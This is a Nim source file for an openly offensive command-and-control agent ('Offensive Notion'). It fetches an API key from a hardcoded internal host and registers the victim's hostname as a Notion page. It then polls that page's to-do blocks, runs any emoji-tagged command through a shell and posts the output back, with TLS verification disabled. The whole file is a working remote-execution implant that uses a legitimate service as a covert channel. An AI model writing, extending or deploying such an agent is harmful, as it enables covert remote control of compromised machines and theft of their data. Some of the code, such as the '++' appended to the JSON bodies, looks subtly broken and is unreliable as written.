import system
import std/[
    json,
    # asyncdispatch,
    strformat, 
    terminal,
    net,
    options
]
import strutils
import parseutils
import sequtils
import os
import nativesockets
import httpclient
import httpcore
import osproc

#[
    Things we need to do:
    Load the API key*
    Start comms by making a new page*
    Sleep* 
    Get new blocks*
    Any new commands?*
    Do em*
]#

const URL_BASE = "https://api.notion.com/v1"
const API_KEY_URL = "http://172.23.8.114:8888/api.txt"

proc getConfigOptions(): (string, string) =
    #[  
        This procedure represents everything we would want to pull in from a config file at compile time.
        TODO: look into TOML/YAML parsing
    ]#
    echo "[*] Enter agent sleep interval > "
    let SLEEP_INTERVAL = readLine(stdin)

    echo "[*] Enter the ID of the parent page > "
    let PARENT_PAGE = readLine(stdin)

    return (SLEEP_INTERVAL, PARENT_PAGE)


# Create Agent Check-in Page
proc createPage(client: HttpClient, configs: tuple): Option[string] =
    let hostname = getHostname()
    let url = fmt"{URL_BASE}/pages/"
    # let proxy = newProxy("http://localhost:8080")

    # Craft JSON body
    var body = %*{
        "parent":{
          "type": "page_id",
          "page_id": fmt"{configs[1]}" 
          },
        "properties": {
            "title": [{
                "text": {
                  "content": hostname
                }
            }]
          }
      }
    var bodyString: string = $body & "++"
    # echo "[*] JSON body:"
    # echo bodyString
    # Craft JSON request

    let res = client.request(url, httpMethod = HttpPost, body = bodyString)
    if res.status == Http200:
      let page = res.body
      return some(parseJson(page)["id"].getStr())
    echo res.status

proc getApiKey(url: string): string =
    let client = newHttpClient()
    let r = client.get(url)
    result = r.body

# Get new blocks*
proc getBlocks(client: HttpClient, page_id: string): Option[JsonNode] =
    let url = &"{URL_BASE}/blocks/{page_id}/children"

    let res = client.get(url)
    if res.status == Http200:
        return some(parseJson(res.body)["results"])
    # echo res.status
    # echo res.body
    return none(JsonNode)

proc extractCommand(cmdBlock: JsonNode): Option[string] =
    try:
        return some(cmdBlock["to_do"]["text"][0]["text"]["content"].getStr())
    except:
        return none(string)

proc completeCommand(client: HttpClient, cmdBlock: JsonNode) =
    cmdBlock["to_do"]["checked"] = newJBool(true)
    let cmdBlockId = cmdBlock["id"].getStr()
    let url = &"{URL_BASE}/blocks/{cmdBlockId}"
    let bodyString: string = $cmdBlock & "++"
    let res = client.patch(url, body=bodyString)
    if res.status != Http200:
        echo res.body

proc sendCommandResult(client: HttpClient, cmdBlockId: string, output: string) =
    # let testUrl = URL_BASE.replace("https","http")
    let url = &"{URL_BASE}/blocks/{cmdBlockId}/children"
    let body = %*{
        "children": [
            {
                "object": "block",
                "type": "quote",
                "quote": {
                    "text": [
                        {
                            "type": "text", 
                            "text": {"content": output},
                            "annotations": {"code": true} 
                        }
                    ]
                }
            }
        ]
    }
    let bodyString = $body & "++"
    let res = client.patch(url, body=bodyString)
    if res.status != Http200:
        echo res.body
        echo bodyString

# Any new commands?

# Do em*


proc main() =
    echo "[*] Offensive Notion! Because Reasons!"

    let NOTION_API_KEY: string = getApiKey(API_KEY_URL)

    if NOTION_API_KEY != "":
        echo "GOT THE API KEY"
    
    let configs = getConfigOptions()
    let headers = newHttpHeaders({
        "Notion-Version": "2021-08-16",
        "Content-Type": "application/json",
        "Authorization":  &"Bearer {NOTION_API_KEY}"
    })
    let proxy = newProxy("http://192.168.1.112:8080")
    let client = newHttpClient(
      headers=headers, 
    #   proxy=proxy, 
      sslContext=newContext(verifyMode=CVerifyNone)
    )
    let pageId: Option[string] = createPage(client, configs)
    var pageIdStr: string
    if pageId.isNone():
        echo "[!] No Parent Page ID acquired!"
        quit(-1)
    else:
        pageIdStr = pageId.get()
        echo &"Parent page: {pageIdStr}"

    while true:
        echo "DOING THE THING"
        let blocks: Option[JsonNode] = getBlocks(client, pageIdStr)
        if blocks.isSome():
            echo "GOT BLOCKS"
            echo pretty(blocks.get())
            let commandBlocks: seq[JsonNode] = blocks
                .get()
                .getElems()
                .filter(
                    proc (b: JsonNode): bool = b["type"].getStr() == "to_do"
                )
            
            let newCommandBlocks: seq[JsonNode] = commandBlocks.filter(
                proc (b: JsonNode): bool = b["to_do"]["checked"].getBool() == false
            )

            for commandBlock in newCommandBlocks.items():
                let command: Option[string] = extractCommand(commandBlock)
                if command.isSome():
                    let commandStr = command.get()
                    if commandStr.contains("🎯"):
                        # let args = command.split(" ")
                        let output = execProcess(
                            commandStr.replace("🎯", ""), 
                            options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon}
                        )
                        completeCommand(client, commandBlock)
                        sendCommandResult(client, commandBlock["id"].getStr(), output)

            echo "ZZZZ"
        sleep(parseInt(configs[0]) * 1000)

when isMainModule:
    main()